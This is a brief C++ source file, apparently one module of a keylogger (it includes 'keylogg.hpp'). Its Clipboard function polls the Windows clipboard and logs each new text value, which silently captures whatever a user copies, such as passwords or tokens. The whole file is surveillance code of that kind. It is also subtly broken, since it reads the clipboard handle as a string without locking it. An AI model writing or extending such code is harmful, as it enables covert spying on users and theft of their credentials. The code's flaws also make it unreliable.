#include "headers.hpp"
#include "keylogg.hpp"

void Clipboard() {

	static HANDLE clip(0);
	static char* buff;
	static string buffstr("");

	OpenClipboard(NULL);

	if (IsClipboardFormatAvailable(CF_TEXT)) clip = GetClipboardData(CF_TEXT);
	else if (IsClipboardFormatAvailable(CF_UNICODETEXT)) clip = GetClipboardData(CF_UNICODETEXT);

	CloseClipboard();

	buff = (char*)clip;
	if (buff != buffstr) {
		buffstr = buff;
		LOG(" #CLIPBOARD>" + buffstr + "<CLIPBOARD# ");
	}
}